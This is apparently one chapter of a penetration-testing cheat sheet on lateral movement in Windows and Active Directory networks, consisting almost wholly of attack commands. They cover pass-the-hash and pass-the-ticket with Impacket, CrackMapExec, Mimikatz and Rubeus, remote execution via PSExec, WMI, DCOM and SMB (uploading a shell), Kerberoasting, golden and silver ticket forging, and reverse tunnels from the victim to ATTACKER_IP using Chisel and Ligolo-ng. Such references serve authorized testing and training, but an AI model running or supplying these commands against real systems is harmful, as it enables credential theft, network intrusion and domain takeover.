# ➡️ Phase 4: Lateral Movement

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Goal:** Move from compromised system to other systems in the network.

---

## 🔑 Credential-Based Movement

### Pass-the-Hash (PTH)
```bash
# Impacket PSExec with hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Export ticket from memory (Mimikatz)
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Or with Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verify ticket
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz - Request TGT with NTLM hash
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Use certificate for authentication
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# With Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Remote Execution Methods

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (more stealthy)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM with password
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM with hash
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# PowerShell remoting
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# CrackMapExec command execution
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# File copy over SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# PsExec style
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# With NTLM hash (restricted admin mode)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Enable RDP remotely
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH with password
ssh user@192.168.1.10

# SSH with key
ssh -i id_rsa user@192.168.1.10

# SSH tunneling/pivoting
ssh -D 9050 user@192.168.1.10  # SOCKS proxy
ssh -L 8080:internal:80 user@192.168.1.10  # Local port forward
```

---

## 🔄 Network Pivoting

### SSH Tunneling
```bash
# Local port forward (access internal:80 via localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Dynamic SOCKS proxy
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Remote port forward
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# On attacker (server)
./chisel server --reverse --port 8080

# On victim (client)
./chisel client ATTACKER_IP:8080 R:socks

# Use with proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# On attacker
./proxy -selfcert

# On victim
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In proxy console
session
start
```

### Metasploit Pivoting
```bash
# Add route through meterpreter session
run autoroute -s 192.168.2.0/24

# Or manually
route add 192.168.2.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Kerberos Attacks

### Kerberoasting
```bash
# Get service tickets
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Find users without preauth
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Crack
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Get krbtgt hash first, then:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Create ticket for specific service
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Quick Reference

### Lateral Movement Techniques

| Technique | Port | Tool |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Required Credentials

| Method | Requirement |
|--------|-------------|
| Pass-the-Hash | NTLM hash |
| Pass-the-Ticket | Kerberos ticket |
| PSExec | Admin + SMB access |
| WinRM | WinRM enabled + Admin |
| RDP | RDP enabled + RDP group |

---

## 🔗 Related Cheatsheets

- [Impacket](../Impacket/README.md)
- [CrackMapExec](../CrackMapExec/README.md)
- [Evil-WinRM](../Evil-WinRM/README.md)
- [Mimikatz](../Mimikatz/README.md)
- [Rubeus](../Rubeus/README.md)

---

**Previous Phase:** [← 03 - Privilege Escalation](./03-Privilege-Escalation.md)

**Next Phase:** [05 - Persistence →](./05-Persistence.md)
